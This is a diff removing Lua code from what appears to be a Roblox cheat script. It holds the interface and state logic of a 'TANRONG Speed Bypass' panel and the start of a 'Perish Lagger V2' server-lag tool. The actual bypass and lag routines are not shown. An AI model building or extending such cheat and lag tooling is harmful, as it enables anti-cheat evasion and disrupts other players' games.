-	pcall(function()
-		local a = getTanrongLogoAsset and getTanrongLogoAsset()
-		if a and a ~= "" then bgImg.Image = a end
-	end)
-	bgImg.ScaleType = Enum.ScaleType.Crop
-	bgImg.ImageTransparency = 0.35
-	bgImg.ZIndex = 0
-	corner(bgImg, 13)
-
-	local header = Instance.new("Frame", main)
-	header.Size = UDim2.new(1, -6, 0, 31)
-	header.Position = UDim2.fromOffset(3, 3)
-	header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	header.BackgroundTransparency = 0.15
-	header.BorderSizePixel = 0
-	header.ZIndex = 4
-	corner(header, 10)
-
-	local titleNoxa = Instance.new("TextLabel", header)
-	titleNoxa.Size = UDim2.fromOffset(70, 31)
-	titleNoxa.Position = UDim2.fromOffset(12, 0)
-	titleNoxa.BackgroundTransparency = 1
-	titleNoxa.Text = "TANRONG"
-	titleNoxa.TextColor3 = Color3.fromRGB(255, 255, 255)
-	titleNoxa.Font = Enum.Font.GothamBold
-	titleNoxa.TextSize = 12
-	titleNoxa.TextXAlignment = Enum.TextXAlignment.Left
-	titleNoxa.ZIndex = 6
-
-	local titleBypass = Instance.new("TextLabel", header)
-	titleBypass.Size = UDim2.fromOffset(70, 31)
-	titleBypass.Position = UDim2.fromOffset(84, 0)
-	titleBypass.BackgroundTransparency = 1
-	titleBypass.Text = "BYPASS"
-	titleBypass.TextColor3 = Color3.fromRGB(220, 30, 40)
-	titleBypass.Font = Enum.Font.GothamBold
-	titleBypass.TextSize = 12
-	titleBypass.TextXAlignment = Enum.TextXAlignment.Left
-	titleBypass.ZIndex = 6
-
-	-- LOCK ngay cạnh nút - (giống Ping Lagger: LOCK cạnh ⚙)
-	local lockBtn = Instance.new("TextButton", header)
-	lockBtn.Size = UDim2.fromOffset(48, 22)
-	lockBtn.Position = UDim2.new(1, -88, 0.5, -11)
-	lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
-	lockBtn.BorderSizePixel = 0
-	lockBtn.Text = "LOCK"
-	lockBtn.TextColor3 = Color3.fromRGB(180, 180, 190)
-	lockBtn.Font = Enum.Font.GothamBold
-	lockBtn.TextSize = 9
-	lockBtn.ZIndex = 8
-	lockBtn.AutoButtonColor = false
-	corner(lockBtn, 6)
-	stroke(lockBtn, Color3.fromRGB(48, 48, 48), 1)
-
-	local hideBtn = Instance.new("TextButton", header)
-	hideBtn.Size = UDim2.fromOffset(30, 22)
-	hideBtn.Position = UDim2.new(1, -36, 0.5, -11)
-	hideBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	hideBtn.BorderSizePixel = 0
-	hideBtn.Text = "-"
-	hideBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-	hideBtn.Font = Enum.Font.GothamBold
-	hideBtn.TextSize = 16
-	hideBtn.ZIndex = 7
-	hideBtn.AutoButtonColor = false
-	corner(hideBtn, 7)
-	stroke(hideBtn, Color3.fromRGB(48, 48, 48), 1)
-
-	-- Keybind row
-	local keyRow = Instance.new("Frame", main)
-	keyRow.Size = UDim2.new(1, -18, 0, 28)
-	keyRow.Position = UDim2.fromOffset(9, 42)
-	keyRow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	keyRow.BackgroundTransparency = 0.2
-	keyRow.BorderSizePixel = 0
-	keyRow.ZIndex = 4
-	corner(keyRow, 7)
-	stroke(keyRow, Color3.fromRGB(44, 44, 44), 1)
-
-	local kbLbl = Instance.new("TextLabel", keyRow)
-	kbLbl.Size = UDim2.fromOffset(28, 28)
-	kbLbl.Position = UDim2.fromOffset(10, 0)
-	kbLbl.BackgroundTransparency = 1
-	kbLbl.Text = "KB:"
-	kbLbl.TextColor3 = Color3.fromRGB(125, 125, 125)
-	kbLbl.Font = Enum.Font.GothamBold
-	kbLbl.TextSize = 9
-	kbLbl.ZIndex = 5
-
-	local kbButton = Instance.new("TextButton", keyRow)
-	kbButton.Size = UDim2.fromOffset(60, 22)
-	kbButton.Position = UDim2.fromOffset(40, 3)
-	kbButton.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
-	kbButton.BorderSizePixel = 0
-	kbButton.Text = boundKey.Name
-	kbButton.TextColor3 = Color3.fromRGB(248, 248, 248)
-	kbButton.Font = Enum.Font.GothamBold
-	kbButton.TextSize = 10
-	kbButton.ZIndex = 6
-	corner(kbButton, 5)
-	stroke(kbButton, Color3.fromRGB(52, 52, 52), 1)
-
-	local bgLbl = Instance.new("TextLabel", keyRow)
-	bgLbl.Size = UDim2.fromOffset(28, 28)
-	bgLbl.Position = UDim2.new(0.5, 8, 0, 0)
-	bgLbl.BackgroundTransparency = 1
-	bgLbl.Text = "BG:"
-	bgLbl.TextColor3 = Color3.fromRGB(125, 125, 125)
-	bgLbl.Font = Enum.Font.GothamBold
-	bgLbl.TextSize = 9
-	bgLbl.ZIndex = 5
-
-	local bgButton = Instance.new("TextButton", keyRow)
-	bgButton.Size = UDim2.fromOffset(50, 22)
-	bgButton.Position = UDim2.new(1, -56, 0, 3)
-	bgButton.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
-	bgButton.BorderSizePixel = 0
-	bgButton.Text = "#" .. tostring(savedBgIndex)
-	bgButton.TextColor3 = Color3.fromRGB(240, 200, 200)
-	bgButton.Font = Enum.Font.GothamBold
-	bgButton.TextSize = 10
-	bgButton.ZIndex = 6
-	corner(bgButton, 5)
-	stroke(bgButton, Color3.fromRGB(52, 52, 52), 1)
-
-	-- Status ring area
-	local ringInner = Instance.new("Frame", main)
-	ringInner.Size = UDim2.new(1, -20, 0, 110)
-	ringInner.Position = UDim2.fromOffset(10, 80)
-	ringInner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	ringInner.BackgroundTransparency = 0.25
-	ringInner.BorderSizePixel = 0
-	ringInner.ZIndex = 4
-	corner(ringInner, 12)
-	stroke(ringInner, Color3.fromRGB(40, 40, 48), 1)
-
-	local statusLabel = Instance.new("TextLabel", ringInner)
-	statusLabel.Size = UDim2.new(1, 0, 0, 14)
-	statusLabel.Position = UDim2.fromOffset(0, 8)
-	statusLabel.BackgroundTransparency = 1
-	statusLabel.Text = "OFFLINE"
-	statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-	statusLabel.Font = Enum.Font.GothamBold
-	statusLabel.TextSize = 10
-	statusLabel.ZIndex = 5
-
-	local powerText = Instance.new("TextLabel", ringInner)
-	powerText.Size = UDim2.new(1, 0, 0, 36)
-	powerText.Position = UDim2.fromOffset(0, 24)
-	powerText.BackgroundTransparency = 1
-	powerText.Text = "97K"
-	powerText.TextColor3 = Color3.fromRGB(255, 255, 255)
-	powerText.Font = Enum.Font.GothamBlack
-	powerText.TextSize = 28
-	powerText.ZIndex = 5
-
-	local timerText = Instance.new("TextLabel", ringInner)
-	timerText.Size = UDim2.new(1, 0, 0, 12)
-	timerText.Position = UDim2.fromOffset(0, 60)
-	timerText.BackgroundTransparency = 1
-	timerText.Text = "00:00"
-	timerText.TextColor3 = Color3.fromRGB(106, 106, 106)
-	timerText.Font = Enum.Font.Gotham
-	timerText.TextSize = 10
-	timerText.ZIndex = 5
-
-	local powerBox = Instance.new("TextBox", ringInner)
-	powerBox.Size = UDim2.new(1, -14, 0, 22)
-	powerBox.Position = UDim2.new(0, 7, 1, -28)
-	powerBox.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
-	powerBox.BorderSizePixel = 0
-	powerBox.ClearTextOnFocus = false
-	powerBox.Text = tostring(_G.AceTanrongBypassPower or 97000)
-	powerBox.TextColor3 = Color3.fromRGB(205, 205, 205)
-	powerBox.Font = Enum.Font.GothamBold
-	powerBox.TextSize = 11
-	powerBox.ZIndex = 6
-	corner(powerBox, 6)
-
-	local activateButton = Instance.new("TextButton", main)
-	activateButton.Size = UDim2.new(1, -18, 0, 40)
-	activateButton.Position = UDim2.fromOffset(9, 200)
-	activateButton.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
-	activateButton.BorderSizePixel = 0
-	activateButton.Text = "ACTIVATE"
-	activateButton.TextColor3 = Color3.fromRGB(220, 30, 40)
-	activateButton.Font = Enum.Font.GothamBold
-	activateButton.TextSize = 12
-	activateButton.AutoButtonColor = false
-	activateButton.ZIndex = 5
-	corner(activateButton, 10)
-
-	local closeBtn = Instance.new("TextButton", main)
-	closeBtn.Size = UDim2.new(1, -18, 0, 28)
-	closeBtn.Position = UDim2.fromOffset(9, 250)
-	closeBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
-	closeBtn.BorderSizePixel = 0
-	closeBtn.Text = "CLOSE"
-	closeBtn.TextColor3 = Color3.fromRGB(255, 180, 180)
-	closeBtn.Font = Enum.Font.GothamBold
-	closeBtn.TextSize = 11
-	closeBtn.ZIndex = 5
-	corner(closeBtn, 8)
-
-	local discLbl = Instance.new("TextLabel", main)
-	discLbl.Size = UDim2.new(1, 0, 0, 22)
-	discLbl.Position = UDim2.fromOffset(0, 288)
-	discLbl.BackgroundTransparency = 1
-	discLbl.Text = "TANRONG · Speed Bypass"
-	discLbl.TextColor3 = Color3.fromRGB(160, 160, 170)
-	discLbl.Font = Enum.Font.GothamBold
-	discLbl.TextSize = 11
-	discLbl.ZIndex = 5
-
-	-- ===== MINI PANEL (nút -) =====
-	local mini = Instance.new("Frame", gui)
-	mini.Name = "MiniFrame"
-	mini.Size = UDim2.fromOffset(230, 92)
-	mini.Position = main.Position
-	mini.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	mini.BorderSizePixel = 0
-	mini.Active = true
-	mini.Visible = false
-	mini.ClipsDescendants = true
-	mini.ZIndex = 40
-	corner(mini, 13)
-	stroke(mini, Color3.fromRGB(39, 39, 39), 1.3)
-
-	local miniBg = Instance.new("ImageLabel", mini)
-	miniBg.Size = UDim2.new(1, 0, 1, 0)
-	miniBg.BackgroundTransparency = 1
-	miniBg.Image = bgImg.Image
-	miniBg.ScaleType = Enum.ScaleType.Crop
-	miniBg.ImageTransparency = 0.4
-	miniBg.ZIndex = 40
-	corner(miniBg, 13)
-
-	local miniHeader = Instance.new("Frame", mini)
-	miniHeader.Size = UDim2.new(1, -6, 0, 31)
-	miniHeader.Position = UDim2.fromOffset(3, 3)
-	miniHeader.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	miniHeader.BackgroundTransparency = 0.15
-	miniHeader.BorderSizePixel = 0
-	miniHeader.ZIndex = 42
-	corner(miniHeader, 10)
-
-	local miniTitle1 = Instance.new("TextLabel", miniHeader)
-	miniTitle1.Size = UDim2.fromOffset(70, 31)
-	miniTitle1.Position = UDim2.fromOffset(12, 0)
-	miniTitle1.BackgroundTransparency = 1
-	miniTitle1.Text = "TANRONG"
-	miniTitle1.TextColor3 = Color3.fromRGB(255, 255, 255)
-	miniTitle1.Font = Enum.Font.GothamBold
-	miniTitle1.TextSize = 11
-	miniTitle1.ZIndex = 44
-
-	local miniTitle2 = Instance.new("TextLabel", miniHeader)
-	miniTitle2.Size = UDim2.fromOffset(70, 31)
-	miniTitle2.Position = UDim2.fromOffset(84, 0)
-	miniTitle2.BackgroundTransparency = 1
-	miniTitle2.Text = "BYPASS"
-	miniTitle2.TextColor3 = Color3.fromRGB(220, 30, 40)
-	miniTitle2.Font = Enum.Font.GothamBold
-	miniTitle2.TextSize = 11
-	miniTitle2.ZIndex = 44
-
-	-- LOCK cạnh nút + (giống full panel)
-	local miniLock = Instance.new("TextButton", miniHeader)
-	miniLock.Size = UDim2.fromOffset(48, 22)
-	miniLock.Position = UDim2.new(1, -88, 0.5, -11)
-	miniLock.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
-	miniLock.BorderSizePixel = 0
-	miniLock.Text = "LOCK"
-	miniLock.TextColor3 = Color3.fromRGB(180, 180, 190)
-	miniLock.Font = Enum.Font.GothamBold
-	miniLock.TextSize = 9
-	miniLock.ZIndex = 46
-	miniLock.AutoButtonColor = false
-	corner(miniLock, 6)
-	stroke(miniLock, Color3.fromRGB(48, 48, 48), 1)
-
-	local unhideBtn = Instance.new("TextButton", miniHeader)
-	unhideBtn.Size = UDim2.fromOffset(30, 22)
-	unhideBtn.Position = UDim2.new(1, -36, 0.5, -11)
-	unhideBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-	unhideBtn.BorderSizePixel = 0
-	unhideBtn.Text = "+"
-	unhideBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-	unhideBtn.Font = Enum.Font.GothamBold
-	unhideBtn.TextSize = 14
-	unhideBtn.ZIndex = 45
-	unhideBtn.AutoButtonColor = false
-	corner(unhideBtn, 7)
-	stroke(unhideBtn, Color3.fromRGB(48, 48, 48), 1)
-
-	local miniActivate = Instance.new("TextButton", mini)
-	miniActivate.Size = UDim2.new(1, -18, 0, 36)
-	miniActivate.Position = UDim2.fromOffset(9, 42)
-	miniActivate.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
-	miniActivate.BorderSizePixel = 0
-	miniActivate.Text = "ACTIVATE"
-	miniActivate.TextColor3 = Color3.fromRGB(220, 30, 40)
-	miniActivate.Font = Enum.Font.GothamBold
-	miniActivate.TextSize = 11
-	miniActivate.AutoButtonColor = false
-	miniActivate.ZIndex = 42
-	corner(miniActivate, 10)
-
-	-- ===== STATE =====
-	local active = false
-	local locked = false
-	local forceSetLocked
-	local minimized = false
-	local startedAt = 0
-	local userWantedActive = false
-
-	local function formatPower(n)
-n = tonumber(n) or 97000
-if n >= 1000 then return string.format("%dK", math.floor(n / 1000 + 0.5)) end
-return tostring(n)
-	end
-
-	local function syncActivateUI()
-local label = active and "DEACTIVATE" or "ACTIVATE"
-local bg = active and Color3.fromRGB(200, 0, 0) or Color3.fromRGB(16, 16, 16)
-local tc = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(220, 30, 40)
-activateButton.Text = label
-activateButton.BackgroundColor3 = bg
-activateButton.TextColor3 = tc
-miniActivate.Text = label
-miniActivate.BackgroundColor3 = bg
-miniActivate.TextColor3 = tc
-statusLabel.Text = active and "ONLINE" or "OFFLINE"
-statusLabel.TextColor3 = active and Color3.fromRGB(80, 255, 120) or Color3.fromRGB(200, 200, 200)
-	end
-
-	-- setActive: bình thường — KHÔNG nhận diện brainrot / không auto OFF
-	local function setActive(state, fromUser)
-state = state and true or false
-local panelOpen = (main.Visible or mini.Visible) and true or false
-if fromUser then
-userWantedActive = state
-uiWantedActive = state
-end
-local shouldRun = state and panelOpen
-active = shouldRun
-uiActive = shouldRun
-if active then
-startedAt = os.clock()
-local n = math.clamp(tonumber(powerBox.Text) or 97000, 1, 999999)
-startBypass(n)
-else
-stopBypass()
-timerText.Text = "00:00"
-end
-syncActivateUI()
--- Lưu trạng thái ON/OFF + panel
-pcall(function() saveCfg(main, powerBox.Text) end)
-	end
-
-	local function applyBg(idx)
-savedBgIndex = math.clamp(tonumber(idx) or 1, 1, #BG_IDS)
-local id = BG_IDS[savedBgIndex]
-bgImg.Image = "rbxassetid://" .. id
-if savedBgIndex == 1 then
- pcall(function()
-  local a = getTanrongLogoAsset and getTanrongLogoAsset()
-  if a and a ~= "" then bgImg.Image = a end
- end)
-end
-miniBg.Image = bgImg.Image
-bgButton.Text = "#" .. tostring(savedBgIndex)
-saveCfg(main, powerBox.Text)
-	end
-
-	local function setMinimized(on)
-minimized = on and true or false
-uiMinimized = minimized
-if minimized then
-mini.Position = main.Position
-main.Visible = false
-mini.Visible = true
-else
-main.Position = mini.Position
-mini.Visible = false
-main.Visible = true
-end
-_G.AceTanrongBypassPanelOpen = true
-pcall(function() saveCfg(main, powerBox.Text) end)
-	end
-
-	-- Events
-	activateButton.MouseButton1Click:Connect(function()
-setActive(not (userWantedActive or active), true)
-	end)
-	miniActivate.MouseButton1Click:Connect(function()
-setActive(not (userWantedActive or active), true)
-	end)
-
-	powerBox.FocusLost:Connect(function()
-local n = math.clamp(tonumber(powerBox.Text) or 97000, 1, 999999)
-powerBox.Text = tostring(n)
-powerText.Text = formatPower(n)
-_G.AceTanrongBypassPower = n
-saveCfg(main, n)
-if active then startBypass(n) end
-	end)
-
-	kbButton.MouseButton1Click:Connect(function()
-waitingForKey = true
-kbButton.Text = "..."
-	end)
-
-	bgButton.MouseButton1Click:Connect(function()
-applyBg((savedBgIndex % #BG_IDS) + 1)
-	end)
-
-	local function syncLockUI()
-local t = locked and "UNLOCK" or "LOCK"
-local bg = locked and Color3.fromRGB(80, 30, 30) or Color3.fromRGB(30, 30, 30)
-lockBtn.Text = t
-lockBtn.BackgroundColor3 = bg
-miniLock.Text = t
-miniLock.BackgroundColor3 = bg
-	end
-	lockBtn.MouseButton1Click:Connect(function()
-forceSetLocked(not locked)
-pcall(function() saveCfg(main, powerBox and powerBox.Text or "97000") end)
-	end)
-	miniLock.MouseButton1Click:Connect(function()
-forceSetLocked(not locked)
-pcall(function() saveCfg(main, powerBox and powerBox.Text or "97000") end)
-	end)
-	-- Double-check: nếu UI báo UNLOCK mà vẫn locked=true → bấm lại force
-	_G.AceSetTanrongBypassLock = function(on)
-forceSetLocked(on)
-	end
-
-	hideBtn.MouseButton1Click:Connect(function() setMinimized(true) end)
-	unhideBtn.MouseButton1Click:Connect(function() setMinimized(false) end)
-
-	-- Drag (main + mini) — riêng lock Speed Bypass, không dính St.guiLock
-	-- Kéo bằng header / vùng trống; Unlock phải kéo được ngay
-	local function makeDrag(frame)
-local dragging, dragStart, startPos = false, nil, nil
-local UIS_ = UserInputService or UIS or game:GetService("UserInputService")
-local function isInteractive(obj)
-while obj and obj ~= frame do
-if obj:IsA("TextBox") then return true end
-if obj:IsA("GuiButton") then
-local n = tostring(obj.Name or "")
--- cho phép kéo nếu bấm vào vùng không phải nút chức năng quan trọng
-if n == "LockBtn" or n == "MiniLock" or n == "CloseBtn" or n == "HideBtn"
-or n == "UnhideBtn" or n == "ActivateBtn" or n == "KbBtn" or n == "BgBtn" then
-return true
-end
--- TextButton con khác (level...) cũng không bắt đầu drag
-return true
-end
-obj = obj.Parent
-end
-return false
-end
--- Header drag handle: top 36px luôn kéo được khi unlock
-local dragPad = frame:FindFirstChild("DragPad")
-if not dragPad then
-dragPad = Instance.new("TextButton")
-dragPad.Name = "DragPad"
-dragPad.Size = UDim2.new(1, -100, 0, 36)
-dragPad.Position = UDim2.new(0, 0, 0, 0)
-dragPad.BackgroundTransparency = 1
-dragPad.Text = ""
-dragPad.ZIndex = 50
-dragPad.AutoButtonColor = false
-dragPad.Parent = frame
-end
-local function beginDrag(input)
-if locked then return end
-if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
-return
-end
-dragging = true
-dragStart = input.Position
-startPos = frame.Position
-end
-dragPad.InputBegan:Connect(beginDrag)
-frame.InputBegan:Connect(function(input)
-if locked then return end
-if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
-return
-end
--- vùng trống (không nút) vẫn kéo
-if isInteractive(input.Target) then return end
-beginDrag(input)
-end)
-UIS_.InputChanged:Connect(function(input)
-if not dragging then return end
-if locked then
-dragging = false
-return
-end
-if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then
-return
-end
-local d = input.Position - dragStart
-local np = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
-frame.Position = np
-if frame == main and mini then mini.Position = np end
-if frame == mini and main then main.Position = np end
-end)
-UIS_.InputEnded:Connect(function(input)
-if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
-return
-end
-if not dragging then return end
-dragging = false
-pcall(function()
-local p = main and main.Position
-if p then
-savedPos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
-_G.AceTanrongBypassPanelPosition = savedPos
-end
-saveCfg(main, powerBox and powerBox.Text or "97000")
-end)
-end)
-	end
-
-	forceSetLocked = function(on)
-locked = on and true or false
-_G.AceTanrongBypassLocked = locked
-if type(St) == "table" then St.speedBypassLock = locked end
--- bảo đảm Active để nhận input sau unlock
-pcall(function()
-if main then main.Active = true end
-if mini then mini.Active = true end
-end)
-pcall(syncLockUI)
-	end
-
-	makeDrag(main)
-	makeDrag(mini)
-
-	-- PC keybind
-	UserInputService.InputBegan:Connect(function(input, gpe)
-if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
-if input.KeyCode ~= Enum.KeyCode.Escape and input.KeyCode ~= Enum.KeyCode.Unknown then
-boundKey = input.KeyCode
-kbButton.Text = boundKey.Name
-waitingForKey = false
-saveCfg(main, powerBox.Text)
-else
-waitingForKey = false
-kbButton.Text = boundKey.Name
-end
-return
-end
-if gpe then return end
-if input.UserInputType == Enum.UserInputType.Keyboard and boundKey and input.KeyCode == boundKey then
--- chỉ toggle khi panel đang hiện (full hoặc mini)
-if main.Visible or mini.Visible then
-setActive(not (userWantedActive or active), true)
-end
-end
-	end)
-
-	-- Chỉ OFF khi ẩn panel — KHÔNG nhận diện brainrot / WalkSpeed
-	RunService.Heartbeat:Connect(function()
-local panelOpen = main.Visible or mini.Visible
-if not panelOpen then
-if active then
-active = false
-stopBypass()
-syncActivateUI()
-end
-end
-	end)
-
-	-- Timer
-	RunService.RenderStepped:Connect(function()
-if active then
-local elapsed = math.floor(os.clock() - startedAt)
-timerText.Text = string.format("%02d:%02d", math.floor(elapsed / 60), elapsed % 60)
-end
-	end)
-
-	local function setPanelVisible(on, opts)
-on = on and true or false
-opts = type(opts) == "table" and opts or {}
-if not on then
--- Ẩn panel → OFF bypass + lưu PanelOpen=false
-userWantedActive = false
-uiWantedActive = false
-if active then setActive(false, false) end
-stopBypass()
-active = false
-uiActive = false
-if main and main.Parent then
-local p = (minimized and mini or main).Position
-savedPos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
-_G.AceTanrongBypassPanelPosition = savedPos
-end
-main.Visible = false
-mini.Visible = false
-minimized = false
-uiMinimized = false
-_G.AceTanrongBypassPanelOpen = false
-syncActivateUI()
-saveCfg(main, powerBox.Text, { PanelOpen = false, Minimized = false, WantedActive = false })
-return
-end
-local sp = _G.AceTanrongBypassPanelPosition or savedPos
-if type(sp) == "table" then
-local pos = UDim2.new(tonumber(sp.xs) or 0.5, tonumber(sp.xo) or -115, tonumber(sp.ys) or 0.35, tonumber(sp.yo) or 0)
-main.Position = pos
-mini.Position = pos
-end
-local wantMini = opts.minimized == true or (opts.minimized == nil and savedMinimized == true and opts.fromLoad == true)
-minimized = wantMini and true or false
-uiMinimized = minimized
-if minimized then
-main.Visible = false
-mini.Visible = true
-else
-main.Visible = true
-mini.Visible = false
-end
-_G.AceTanrongBypassPanelOpen = true
-pcall(function()
-if gui then
-gui.Enabled = true
-gui.DisplayOrder = 250
-if not gui.Parent then
-local parent = (gethui and gethui()) or game:GetService("CoreGui")
-gui.Parent = parent
-end
-end
-end)
-pcall(function()
-saveCfg(main, powerBox and powerBox.Text or "97000", { PanelOpen = true, Minimized = minimized })
-end)
--- Restore bypass nếu trước đó đang ON
-if opts.restoreActive or (opts.fromLoad and savedWantedActive) then
-userWantedActive = true
-uiWantedActive = true
-setActive(true, false)
-end
-	end
-
-	_G.AceSetTanrongBypassPanelVisible = setPanelVisible
-	_G.AceToggleTanrongBypassPanel = function()
-setPanelVisible(not (main.Visible or mini.Visible))
-	end
-
-	closeBtn.MouseButton1Click:Connect(function()
-setPanelVisible(false)
-	end)
-
-	-- init
-	powerText.Text = formatPower(powerBox.Text)
-	applyBg(savedBgIndex)
-	syncActivateUI()
-	-- Tự hiện panel nếu lần trước không ẩn (PanelOpen=true)
-	-- No tự mở panel khi ON script — chỉ mở khi Settings Show Panel = true
-	_G.AceSetTanrongBypassLock = function(on)
-locked = on and true or false
-_G.AceTanrongBypassLocked = locked
-pcall(syncLockUI)
-	end
-	-- sync lock từ St / _G (độc lập Lock UI menu)
-	pcall(function()
-local wantLock = false
-if type(St) == "table" and St.speedBypassLock then wantLock = true end
-if _G.AceTanrongBypassLocked == true then wantLock = true end
-locked = wantLock
-syncLockUI()
-	end)
-	task.defer(function()
-task.wait(0.15)
-local wantOpen = false
-pcall(function()
-if type(St) == "table" and St.showSpeedBypassPanel == true then wantOpen = true end
-end)
-if wantOpen then
-pcall(function()
-setPanelVisible(true, { fromLoad = true, minimized = false, restoreActive = false })
-end)
-else
--- luôn ẩn khi load nếu user không ON show
-pcall(function()
-if main then main.Visible = false end
-if mini then mini.Visible = false end
-_G.AceTanrongBypassPanelOpen = false
-saveCfg(main, powerBox and powerBox.Text or "97000", { PanelOpen = false })
-end)
-end
-	end)
-	print("[Tanrong] TANRONGBypass panel loaded (Noxa-style + keybind + minimize + remember open)")
 end)
 
 
-
--- ============================================================
-
--- PERISH LAGGER V2 — isolated function scope (tránh 200 local limit)
-task.spawn(function()
-	local Players = game:GetService("Players")
-	local UserInputService = game:GetService("UserInputService")
-	local TweenService = game:GetService("TweenService")
-	local CoreGui = game:GetService("CoreGui")
-	local HttpService = game:GetService("HttpService")
-	local RunService = game:GetService("RunService")
-	local Stats = game:GetService("Stats")
-
-	local LP = Players.LocalPlayer
-	local PlayerGui = LP:WaitForChild("PlayerGui")
-	local ConfigFile = "TANRONGPerishLaggerV2.json"
-
-	local NIVELES = {
-Low = { poder = 23 },
-Mid = { poder = 32 },
-High = { poder = 70 },
-Ultra = { poder = 90 },
-	}
-	local ORDER = { "Low", "Mid", "High", "Ultra" }
-
-	local keybind = Enum.KeyCode.M
-	local listeningForInput = false
-	local laggerActive = false
-	local lagThread = nil
-	local nivelActual = "Low"
-	local ventanaBloqueada = false
-
-	local C = {
-BG = Color3.fromRGB(8, 0, 0),
-Row = Color3.fromRGB(20, 4, 4),
-Card = Color3.fromRGB(30, 6, 6),
-Red = Color3.fromRGB(255, 20, 20),
-RedDeep = Color3.fromRGB(120, 0, 0),
-RedSoft = Color3.fromRGB(255, 80, 80),
-RedDark = Color3.fromRGB(60, 8, 8),
-Text = Color3.fromRGB(255, 255, 255),
-TextDim = Color3.fromRGB(200, 180, 180),
-Stroke = Color3.fromRGB(255, 30, 30),
-Dark = Color3.fromRGB(5, 0, 0),
-Off = Color3.fromRGB(40, 10, 10),
-White = Color3.fromRGB(255, 255, 255),
-Gray = Color3.fromRGB(128, 128, 128),
-Green = Color3.fromRGB(90, 255, 170),
-Yellow = Color3.fromRGB(255, 220, 90),
-	}
-
-	local function corner(p, r)
-local x = Instance.new("UICorner")
-x.CornerRadius = UDim.new(0, r or 10)
-x.Parent = p
-return x
-	end
-	local function stroke(p, col, th, tr)
-local s = Instance.new("UIStroke")
-s.Color = col or C.Stroke
-s.Thickness = th or 1.2
-s.Transparency = tr or 0.35
-s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-s.Parent = p
-return s
-	end
-	local function shineStroke(obj)
-local s = stroke(obj, C.Red, 1.4, 0.3)
-task.spawn(function()
-local t = 0
-while s and s.Parent do
-local mf = s:FindFirstAncestorOfClass("Frame")
--- slow down when not on-screen heavy parent visible
-if mainFrame and not mainFrame.Visible then
-task.wait(0.6)
-else
-t = t + 0.05
-s.Transparency = 0.2 + math.sin(t * 1.6) * 0.18
-if math.sin(t * 0.8) > 0.7 then s.Color = C.White else s.Color = C.Red end
-task.wait(0.06)
-end
-end
-end)
-return s
-	end
-	local function highlight(obj, col)
-local g = Instance.new("UIGradient", obj)
-g.Color = ColorSequence.new({
-ColorSequenceKeypoint.new(0, col or C.Red),
-ColorSequenceKeypoint.new(0.5, C.White),
-ColorSequenceKeypoint.new(1, col or C.Red),
-})
-g.Rotation = 25
-task.spawn(function()
-while g and g.Parent do
-if mainFrame and not mainFrame.Visible then
-task.wait(0.6)
-else
-g.Offset = Vector2.new((tick() * 0.35) % 2 - 1, 0)
-task.wait(0.06)
-end
-end
-end)
-return g
-	end
-	local function hoverLift(btn, base)
-base = base or 0.15
-btn.MouseEnter:Connect(function()
-TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = math.max(0, base - 0.15) }):Play()
-end)
-btn.MouseLeave:Connect(function()
-TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = base }):Play()
-end)
-btn.MouseButton1Down:Connect(function()
-TweenService:Create(btn, TweenInfo.new(0.08), { Size = btn.Size - UDim2.new(0, 2, 0, 2) }):Play()
-end)
-btn.MouseButton1Up:Connect(function()
--- size restore handled by parent layout mostly
-end)
-	end
-
-	local mainFrame -- forward
-	local savedPos = nil
-	local v2PanelScale = 70 -- declare early (tránh shadow / nil khi SaveConfig)
-	local function SaveConfig()
-local data = {
-Nivel = nivelActual,
-Bloqueado = (_G.AcePerishV2Locked == true),
-Locked = (_G.AcePerishV2Locked == true),
-Key = keybind.Name,
-Scale = math.clamp(tonumber(v2PanelScale) or tonumber(_G.AcePerishV2PanelScale) or 70, 1, 100),
-PanelOpen = (_G.AcePerishV2PanelOpen == true),
-}
--- Ưu tiên vị trí hiện tại; nếu panel đang ẩn vẫn giữ Pos đã lưu
-if mainFrame and mainFrame.Parent and mainFrame.Visible then
-local p = mainFrame.Position
-data.Pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
-_G.AcePerishV2PanelPosition = data.Pos
-savedPos = data.Pos
-elseif type(_G.AcePerishV2PanelPosition) == "table" then
-data.Pos = _G.AcePerishV2PanelPosition
-savedPos = data.Pos
-elseif type(savedPos) == "table" then
-data.Pos = savedPos
-end
-pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
-	end
-
-	local function LoadConfig()
-pcall(function()
-if not (isfile and isfile(ConfigFile)) then return end
-local data = HttpService:JSONDecode(readfile(ConfigFile))
-nivelActual = data.Nivel or "Low"
